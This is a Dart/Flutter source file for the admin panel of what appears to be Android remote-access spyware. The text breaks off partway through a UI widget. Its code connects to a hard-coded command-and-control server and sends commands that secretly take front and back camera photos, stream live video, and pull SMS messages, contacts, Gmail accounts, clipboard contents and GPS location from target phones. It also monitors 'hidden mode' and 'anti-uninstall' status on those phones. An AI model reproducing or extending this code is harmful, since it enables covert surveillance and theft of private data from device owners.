// ignore_for_file: use_build_context_synchronously
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false; 
  
  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};
  
  late AnimationController _pulseController;
  late AnimationController _glowController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _glowAnimation;
  
  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();

  final ValueNotifier<Uint8List?> _liveFrameNotifier = ValueNotifier(null);
  final ValueNotifier<Uint8List?> _frontCameraNotifier = ValueNotifier(null);
  final ValueNotifier<Uint8List?> _backCameraNotifier = ValueNotifier(null);

  // Premium Color Theme
  final Color _primaryColor = const Color(0xFF00E5FF); // Cyan Neon
  final Color _secondaryColor = const Color(0xFF7C4DFF); // Purple
  final Color _accentColor = const Color(0xFFFF3366); // Pink/Red
  final Color _successColor = const Color(0xFF00E676);
  final Color _warningColor = const Color(0xFFFF9800);
  final Color _cardColor = const Color(0xFF1A1A2E);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );
    _pulseAnimation = Tween<double>(begin: 0.8, end: 1.0).animate(_pulseController);
    _pulseController.repeat(reverse: true);
    
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2000),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    if (!_isInit) {
      final args = ModalRoute.of(context)?.settings.arguments;
      if (args is Map<String, dynamic>) {
        final device = args['device'] as Map<String, dynamic>?;
        if (device != null) {
          _targetId = device['id']?.toString() ?? "unknown";
          _targetModel = device['model']?.toString() ?? "TARGET DEVICE";
          _deviceData = device;
        }
      }
      _initSocket();
      _isInit = true;
    }
  }

  void _initSocket() {
    try {
      socket = IO.io(
        'http://panel-legal.jhonaley.net:3018',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL'})
            .enableAutoConnect()
            .setReconnectionAttempts(10)
            .setReconnectionDelay(3000)
            .setTimeout(10000)
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("SYSTEM: C2 Link Established", LogType.success);
          socket.emit('admin_ready', {'status': 'online'});
        }
      });

      socket.onConnectError((data) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("SYSTEM: Connection Error - $data", LogType.error);
        }
      });

      socket.onDisconnect((_) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("SYSTEM: C2 Link Terminated", LogType.warning);
        }
      });

      socket.on('new_response', (data) {
        String cmd = data['cmd'] ?? 'unknown';
        dynamic responseData = data['data'];
        
        _addLog("INCOMING: $cmd", LogType.info);
        
        if (cmd == "take_photo" || cmd == "get_screen" || cmd == "take_photo_flutter") {
          String imageData = responseData['image'] ?? responseData['screenshot'] ?? '';
          if (imageData.isNotEmpty) {
            _showCapturedPhoto(imageData, cmd);
          }
        } else {
          _handleDataDisplay(cmd, responseData);
        }
        
        _updateCachedData(cmd, responseData);
      });

      socket.on('new_notification', (data) {
        _addLog("NOTIF: [${data['title']}] ${data['body']}", LogType.notification);
        _showNotificationSnackbar(data['title'] ?? "Alert", data['body'] ?? "");
        
        if (mounted) {
          setState(() {
            if (_deviceData['sms'] == null) _deviceData['sms'] = [];
            (_deviceData['sms'] as List).insert(0, {
              'address': data['title'] ?? data['app'],
              'body': data['body'] ?? data['message'],
              'date': data['timestamp'] ?? DateTime.now().millisecondsSinceEpoch,
            });
          });
        }
      });
      
      socket.on('live_frame', (data) {
        if (data['id'] == _targetId || data['deviceId'] == _targetId) {
          String imageData = data['image'] ?? '';
          if (imageData.contains(',')) imageData = imageData.split(',').last;
          if (imageData.isNotEmpty) {
            try {
              _liveFrameNotifier.value = base64Decode(imageData.replaceAll(RegExp(r'\s+'), ''));
            } catch (e) {
              debugPrint("=> [STREAM] Base64 Decode Error: $e");
            }
          }
        }
      });
      
      socket.on('heartbeat', (data) {
        if (mounted && data['deviceId'] == _targetId) {
          setState(() {
            _deviceData['battery'] = data['battery'];
            _deviceData['last_seen'] = DateTime.now();
          });
        }
      });
      
      socket.on('device_info', (data) {
        if (data['id'] == _targetId) {
          setState(() {
            _deviceData.addAll(data);
          });
        }
      });

      socket.connect();
    } catch (e) {
      _addLog("SYSTEM: Socket Init Failed - $e", LogType.error);
    }
  }

  void _updateCachedData(String cmd, dynamic data) {
    if (!mounted || data == null) return;
    setState(() {
      dynamic payload = data;
      if (data is Map && data.containsKey('data')) payload = data['data'];

      switch (cmd) {
        case "get_contacts": _deviceData['contacts'] = payload is List ? payload : (payload['contacts'] ?? []); break;
        case "get_sms": _deviceData['sms'] = payload is List ? payload : (payload['sms'] ?? []); break;
        case "get_apps": _deviceData['apps'] = payload is List ? payload : (payload['apps'] ?? []); break;
        case "get_gmails": _deviceData['accounts'] = payload is List ? payload : (payload['accounts'] ?? []); break;
        case "get_location": _deviceData['location'] = payload; break;
      }
    });
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _glowController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _liveFrameNotifier.dispose(); 
    _frontCameraNotifier.dispose();
    _backCameraNotifier.dispose();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (_logScrollController.hasClients) {
          _logScrollController.animateTo(0, duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
        }
      });
    }
  }

  void _showNotificationSnackbar(String title, String body) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.notifications_active, color: Color(0xFFFF9800), size: 20),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, mainAxisSize: MainAxisSize.min,
              children: [Text(title, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 12, fontFamily: 'ShareTechMono')), Text(body, style: const TextStyle(fontSize: 11, fontFamily: 'ShareTechMono'))],
            )),
          ],
        ),
        backgroundColor: Colors.black.withOpacity(0.9),
        duration: const Duration(seconds: 5),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12), side: BorderSide(color: _warningColor.withOpacity(0.3))),
      ),
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(20),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                Colors.white.withOpacity(0.08),
                Colors.white.withOpacity(0.03),
              ],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: Colors.white.withOpacity(0.1), width: 1),
          ),
          child: child,
        ),
      ),
    );
  }

  void _showCapturedPhoto(String base64Image, String title) {
    Uint8List bytes = Uint8List(0);
    try {
      bytes = base64Decode(base64Image.replaceAll(RegExp(r'\s+'), ''));
    } catch (e) {
      _addLog("ERROR: Invalid image data", LogType.error);
      return;
    }
    
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: ClipRRect(
          borderRadius: BorderRadius.circular(24),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [Colors.black.withOpacity(0.95), const Color(0xFF1A1A2E).withOpacity(0.95)]),
                borderRadius: BorderRadius.circular(24),
                border: Border.all(color: _primaryColor.withOpacity(0.4), width: 1.5),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [_primaryColor.withOpacity(0.1), _secondaryColor.withOpacity(0.05)]),
                      borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24)),
                    ),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(gradient: LinearGradient(colors: [_primaryColor, _secondaryColor]), borderRadius: BorderRadius.circular(12)),
                          child: const Icon(Icons.camera_alt, color: Colors.black, size: 18),
                        ),
                        const SizedBox(width: 12),
                        Text(title.toUpperCase(), style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14, fontFamily: 'Orbitron', letterSpacing: 1)),
                        const Spacer(),
                        Text(_formatTime(DateTime.now()), style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 10, fontFamily: 'ShareTechMono')),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(16),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(16),
                      child: InteractiveViewer(
                        minScale: 0.5,
                        maxScale: 4.0,
                        child: Image.memory(bytes, fit: BoxFit.contain,
                          errorBuilder: (context, error, stackTrace) => Container(
                            padding: const EdgeInsets.all(40),
                            color: _accentColor.withOpacity(0.1),
                            child: Column(mainAxisSize: MainAxisSize.min,
                              children: [Icon(Icons.broken_image, color: _accentColor, size: 48), const SizedBox(height: 8), Text("Invalid Stream Data", style: TextStyle(color: _accentColor, fontFamily: 'ShareTechMono'))],
                            ),
                          ),
                        ),
                      ),
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.only(bottom: 16, left: 16, right: 16),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        TextButton.icon(
                          onPressed: () { Clipboard.setData(ClipboardData(text: base64Image)); _addLog("Image data copied to clipboard", LogType.success); },
                          icon: const Icon(Icons.copy, size: 16),
                          label: const Text("COPY", style: TextStyle(fontSize: 12, fontFamily: 'Orbitron')),
                          style: TextButton.styleFrom(foregroundColor: Colors.white70),
                        ),
                        const SizedBox(width: 12),
                        ElevatedButton.icon(
                          onPressed: () => Navigator.pop(context),
                          icon: const Icon(Icons.close, size: 16),
                          label: const Text("CLOSE", style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold)),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.white, foregroundColor: Colors.black,
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _showLiveCameraDialog() {
    _liveFrameNotifier.value = null; 
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: ClipRRect(
          borderRadius: BorderRadius.circular(24),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [Colors.black.withOpacity(0.95), const Color(0xFF1A1A2E).withOpacity(0.95)]),
                borderRadius: BorderRadius.circular(24),
                border: Border.all(color: _accentColor.withOpacity(0.4), width: 1.5),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [_accentColor.withOpacity(0.1), Colors.transparent]),
                      borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24)),
                    ),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(gradient: LinearGradient(colors: [_accentColor, const Color(0xFFE91E63)]), borderRadius: BorderRadius.circular(12)),
                          child: const Icon(Icons.videocam, color: Colors.black, size: 18),
                        ),
                        const SizedBox(width: 12),
                        const Text("LIVE CAMERA STREAM", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14, fontFamily: 'Orbitron', letterSpacing: 1)),
                        const Spacer(),
                        SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: _accentColor)),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(12),
                    child: ValueListenableBuilder<Uint8List?>(
                      valueListenable: _liveFrameNotifier,
                      builder: (context, bytes, child) {
                        if (bytes == null) {
                          return Container(
                            height: 300,
                            width: double.infinity,
                            decoration: BoxDecoration(color: Colors.black.withOpacity(0.5), borderRadius: BorderRadius.circular(16)),
                            child: Column(mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(FontAwesomeIcons.wifi, color: Colors.white38, size: 40), 
                                const SizedBox(height: 10), 
                                Text("Connecting to target stream...", style: TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono')),
                                const SizedBox(height: 10),
                                TextButton(
                                  onPressed: () => _sendCommand("start_live_camera", _targetId),
                                  child: Text("RECONNECT", style: TextStyle(color: _primaryColor))
                                )
                              ],
                            ),
                          );
                        }
                        return ClipRRect(
                          borderRadius: BorderRadius.circular(16), 
                          child: Image.memory(
                            bytes, 
                            fit: BoxFit.contain, 
                            gaplessPlayback: true,
                            width: double.infinity,
                            height: 300,
                          )
                        );
                      },
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.only(bottom: 16, right: 16),
                    child: Align(
                      alignment: Alignment.centerRight,
                      child: ElevatedButton.icon(
                        onPressed: () {
                          _sendCommand("stop_live_camera", _targetId);
                          Navigator.pop(context);
                          _addLog("Live stream terminated by Admin.", LogType.warning);
                        },
                        icon: const Icon(Icons.stop_circle, size: 16),
                        label: const Text("STOP STREAM", style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold)),
                        style: ElevatedButton.styleFrom(
                          backgroundColor: _accentColor, foregroundColor: Colors.white,
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))
                        ),
                      )
                    ),
                  )
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // NEW: Camera Viewer dengan pilihan Front/Back
  void _showCameraViewerDialog() {
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) => Dialog(
          backgroundColor: Colors.transparent,
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
              child: Container(
                width: MediaQuery.of(context).size.width * 0.9,
                constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.8),
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: [Colors.black.withOpacity(0.95), const Color(0xFF1A1A2E).withOpacity(0.95)]),
                  borderRadius: BorderRadius.circular(24),
                  border: Border.all(color: _primaryColor.withOpacity(0.4), width: 1.5),
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [_primaryColor.withOpacity(0.1), Colors.transparent]),
                        borderRadius: const BorderRadius.only(topLeft: Radius.circular(24), topRight: Radius.circular(24)),
                      ),
                      child: Row(
                        children: [
                          Container(
                            padding: const EdgeInsets.all(8),
                            decoration: BoxDecoration(gradient: LinearGradient(colors: [_primaryColor, _secondaryColor]), borderRadius: BorderRadius.circular(12)),
                            child: const Icon(Icons.camera_enhance, color: Colors.black, size: 18),
                          ),
                          const SizedBox(width: 12),
                          const Text("CAMERA CONTROL", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14, fontFamily: 'Orbitron', letterSpacing: 1)),
                        ],
                      ),
                    ),
                    
                    // Tab Selector
                    Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                      child: Row(
                        children: [
                          Expanded(
                            child: GestureDetector(
                              onTap: () {
                                _sendCommand("take_photo", _targetId, extra: "front");
                                _addLog("Capturing Front Camera...", LogType.info);
                              },
                              child: Container(
                                padding: const EdgeInsets.symmetric(vertical: 12),
                                decoration: BoxDecoration(
                                  color: Colors.blue.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(color: Colors.blue.withOpacity(0.5))
                                ),
                                child: const Center(child: Text("FRONT CAMERA", style: TextStyle(color: Colors.blue, fontFamily: 'Orbitron', fontSize: 12))),
                              ),
                            ),
                          ),
                          const SizedBox(width: 10),
                          Expanded(
                            child: GestureDetector(
                              onTap: () {
                                _sendCommand("take_photo", _targetId, extra: "back");
                                _addLog("Capturing Back Camera...", LogType.info);
                              },
                              child: Container(
                                padding: const EdgeInsets.symmetric(vertical: 12),
                                decoration: BoxDecoration(
                                  color: Colors.green.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(color: Colors.green.withOpacity(0.5))
                                ),
                                child: const Center(child: Text("BACK CAMERA", style: TextStyle(color: Colors.green, fontFamily: 'Orbitron', fontSize: 12))),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),

                    const SizedBox(height: 10),

                    // Image Display Area
                    Flexible(
                      child: SingleChildScrollView(
                        child: Column(
                          children: [
                            // Front Camera Preview
                            if (_frontCameraNotifier.value != null) ...[
                              const Text("FRONT CAPTURE", style: TextStyle(color: Colors.blue, fontSize: 10, fontFamily: 'Orbitron')),
                              ClipRRect(
                                borderRadius: BorderRadius.circular(12),
                                child: Image.memory(_frontCameraNotifier.value!, fit: BoxFit.contain)
                              ),
                              const SizedBox(height: 10),
                            ],

                            // Back Camera Preview
                            if (_backCameraNotifier.value != null) ...[
                              const Text("BACK CAPTURE", style: TextStyle(color: Colors.green, fontSize: 10, fontFamily: 'Orbitron')),
                              ClipRRect(
                                borderRadius: BorderRadius.circular(12),
                                child: Image.memory(_backCameraNotifier.value!, fit: BoxFit.contain)
                              ),
                              const SizedBox(height: 10),
                            ],

                            if (_frontCameraNotifier.value == null && _backCameraNotifier.value == null)
                              Container(
                                height: 200,
                                decoration: BoxDecoration(
                                  color: Colors.black.withOpacity(0.3),
                                  borderRadius: BorderRadius.circular(12)
                                ),
                                child: Center(
                                  child: Column(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Icon(Icons.camera_alt, color: Colors.white24, size: 40),
                                      const SizedBox(height: 8),
                                      Text("Tap button above to capture", style: TextStyle(color: Colors.white38, fontSize: 11))
                                    ],
                                  ),
                                ),
                              ),
                          ],
                        ),
                      ),
                    ),

                    Padding(
                      padding: const EdgeInsets.all(16),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.end,
                        children: [
                          TextButton(
                            onPressed: () {
                              _frontCameraNotifier.value = null;
                              _backCameraNotifier.value = null;
                            },
                            child: const Text("CLEAR", style: TextStyle(color: Colors.grey))
                          ),
                          const SizedBox(width: 10),
                          ElevatedButton.icon(
                            onPressed: () => Navigator.pop(context),
                            icon: const Icon(Icons.close, size: 16),
                            label: const Text("CLOSE"),
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.white, 
                              foregroundColor: Colors.black,
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))
                            ),
                          ),
                        ],
                      ),
                    )
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _handleDataDisplay(String cmd, dynamic data) {
    if (data == null) return;
    switch (cmd) {
      case "take_photo":
        // Handle camera capture result
        String imgData = data['image'] ?? '';
        if (imgData.isNotEmpty) {
          try {
            Uint8List bytes = base64Decode(imgData);
            // Determine which camera based on context or store both
            // For now we show in dialog and also update notifier if needed
            _showCapturedPhoto(imgData, "Photo Captured");
          } catch (e) {
            _addLog("ERROR: Invalid photo data", LogType.error);
          }
        }
        break;
      case "get_location": _addLog("GPS: Lat ${data['lat']}, Lng ${data['lng']}", LogType.location); break;
      case "get_gmails": _addLog("GMAIL: ${(data is List ? data : (data['accounts'] ?? [])).length} account(s) found", LogType.info); break;
      case "get_contacts": _addLog("CONTACTS: ${(data is List ? data : (data['contacts'] ?? [])).length} contact(s) retrieved", LogType.info); break;
      case "get_sms": _addLog("SMS: ${(data is List ? data : (data['sms'] ?? [])).length} message(s) retrieved", LogType.info); break;
      case "get_apps": _addLog("APPS: ${(data is List ? data : (data['apps'] ?? [])).length} application(s) found", LogType.info); break;
      case "get_clipboard": _addLog("CLIPBOARD: ${data['clipboard'] ?? 'Empty'}", LogType.info); break;
      default: _addLog("DATA: $cmd - ${data.toString().length > 50 ? data.toString().substring(0, 50) : data.toString()}...", LogType.debug);
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra}) async {
    if (!_isConnected) { _addLog("WARNING: No C2 connection", LogType.warning); return; }
    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("http://panel-legal.jhonaley.net:3018/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"deviceId": targetId, "command": command, "extra": extra ?? "", "timestamp": DateTime.now().millisecondsSinceEpoch}),
      ).timeout(const Duration(seconds: 15));
      if (response.statusCode == 200) _addLog("SENT: $command ${extra != null ? '[$extra]' : ''}", LogType.success);
      else _addLog("ERR: Server returned ${response.statusCode}", LogType.error);
    } catch (e) { _addLog("ERR: ${e.toString().substring(0, e.toString().length > 40 ? 40 : e.toString().length)}...", LogType.error); }
    finally { if (mounted) setState(() => _isProcessing = false); }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return _successColor;
      case LogType.error: return _accentColor;
      case LogType.warning: return _warningColor;
      case LogType.notification: return _primaryColor;
      case LogType.location: return const Color(0xFF00E5FF);
      default: return Colors.white70;
    }
  }

  int _parseBattery(dynamic b) {
    if (b is int) return b;
    if (b is double) return b.toInt();
    if (b is String) return int.tryParse(b) ?? 0;
    return 0;
  }

  Color _getBatteryColor(int level) {
    if (level >= 50) return _successColor;
    if (level >= 20) return _warningColor;
    return _accentColor;
  }

  // --- UI COMPONENTS ---
  
  Widget _buildTopHeader() {
    String modelText = _targetModel.split(' ').first.toUpperCase();
    String idText = _targetId.length > 10 ? _targetId.substring(0, 10).toUpperCase() : _targetId.toUpperCase();
    String smallGreyText = "${_targetModel.replaceAll(' ', '').toLowerCase()}-${_targetId.toLowerCase()}-ap3a";

    return Container(
      padding: EdgeInsets.only(top: MediaQuery.of(context).padding.top + 12, left: 16, right: 16, bottom: 12),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 45, height: 45,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _primaryColor.withOpacity(0.4), width: 1.5),
                gradient: LinearGradient(colors: [Colors.white.withOpacity(0.1), Colors.white.withOpacity(0.05)]),
              ),
              child: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
            ),
          ),
          const SizedBox(width: 16),
          AnimatedBuilder(
            animation: _glowAnimation,
            builder: (context, child) {
              return Container(
                width: 55, height: 55,
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: [_primaryColor, _secondaryColor]),
                  borderRadius: BorderRadius.circular(16),
                  boxShadow: [BoxShadow(color: _primaryColor.withOpacity(0.4 * _glowAnimation.value), blurRadius: 15, spreadRadius: 1)],
                ),
                child: const Icon(Icons.phone_android, color: Colors.black, size: 28),
              );
            },
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("NCR- $modelText", style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 16, letterSpacing: 2, fontFamily: 'Orbitron')),
                const SizedBox(height: 2),
                Text(idText, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono')),
                const SizedBox(height: 2),
                Text(smallGreyText, style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 10, fontFamily: 'ShareTechMono'), maxLines: 1, overflow: TextOverflow.ellipsis),
              ],
            ),
          ),
          Container(
            width: 45, height: 45,
            decoration: BoxDecoration(borderRadius: BorderRadius.circular(14), border: Border.all(color: _isConnected ? _successColor : _accentColor, width: 1.5)),
            child: Icon(_isConnected ? FontAwesomeIcons.link : FontAwesomeIcons.linkSlash, color: _isConnected ? _successColor : _accentColor, size: 18),
          ),
        ],
      ),
    );
  }

  Widget _buildQuickStatusRow() {
    int batLevel = _deviceData.containsKey('battery') ? _parseBattery(_deviceData['battery']) : 41;
    bool antiUninstall = _deviceData['antiUninstall'] ?? false;
    bool hiddenMode = _deviceData['hiddenMode'] ?? false;
    
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: Row(
        children: [
          _statusBadge(FontAwesomeIcons.batteryFull, "$batLevel%", _getBatteryColor(batLevel)),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.android, "Android", _primaryColor),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.shieldHalved, antiUninstall ? "PROTECTED" : "VULNERABLE", antiUninstall ? _successColor : _warningColor),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.eyeSlash, hiddenMode ? "HIDDEN" : "VISIBLE", hiddenMode ? Colors.purple : Colors.white70),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.wifi, _deviceData['ip']?.split('.').last ?? "N/A", _primaryColor),
        ],
      ),
    );
  }

  Widget _statusBadge(IconData icon, String text, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.4),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Row(children: [Icon(icon, color: color, size: 12), const SizedBox(width: 6), Text(text, style: TextStyle(color: Colors.white70, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: "ShareTechMono"))]),
    );
  }

  Widget _buildTerminalLogs() {
    return Container(
      height: 130,
      margin: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _isConnected ? _successColor.withOpacity(0.3) : _accentColor.withOpacity(0.3), width: 1),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
          child: Container(
            color: Colors.black.withOpacity(0.7),
            child: ListView.builder(
              controller: _logScrollController,
              reverse: true,
              padding: const EdgeInsets.all(12),
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) {
                final log = _executionLogs[_executionLogs.length - 1 - i];
                return Padding(
                  padding: const EdgeInsets.symmetric(vertical: 3),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text("[${_formatTime(log.timestamp)}]", style: TextStyle(color: Colors.grey[600], fontSize: 9, fontFamily: 'monospace')),
                      const SizedBox(width: 8),
                      Expanded(child: Text(log.message, style: TextStyle(color: _getLogColor(log.type), fontSize: 10, fontFamily: 'monospace'))),
                    ],
                  ),
                );
              },
            ),
          ),
        ),
      ),
    );
  }

  Widget _groupLabel(String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 5),
      child: Row(
        children: [
          Text(text, style: const TextStyle(color: Color(0xFFFF9800), fontSize: 11, fontWeight: FontWeight.bold, letterSpacing: 2, fontFamily: 'Orbitron')),
          const SizedBox(width: 8),
          Expanded(child: Divider(color: const Color(0xFFFF9800).withOpacity(0.3), thickness: 1)),
        ],
      ),
    );
  }

  Widget _actionButton(String label, IconData icon, Color color, String cmd, {bool isInput = false, bool isCustom = false, bool isPage = false, bool isToggle = false, Widget? destination, String? inputHint, VoidCallback? onToggle, String? extra}) {
    return InkWell(
      onTap: () {
        if (cmd == "start_live_camera") { 
          _sendCommand(cmd, _targetId); 
          _showLiveCameraDialog(); 
        }
        else if (cmd == "camera_viewer") {
          _showCameraViewerDialog();
        }
        else if (isCustom) { _showCustomCommandDialog(); }
        else if (isPage && destination != null) {
          if (cmd.isNotEmpty) _sendCommand(cmd, _targetId); 
          Navigator.push(context, MaterialPageRoute(builder: (context) => destination));
        }
        else if (isToggle && onToggle != null) {
          onToggle();
        }
        else if (isInput) { _showInput(label, cmd, _targetId, hint: inputHint); }
        else { _sendCommand(cmd + (extra != null ? ':$extra' : ''), _targetId); }
      },
      borderRadius: BorderRadius.circular(16),
      child: Container(
        width: MediaQuery.of(context).size.width / 3 - 15,
        padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 8),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.4),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.3), width: 1),
          gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight, colors: [color.withOpacity(0.1), Colors.transparent]),
        ),
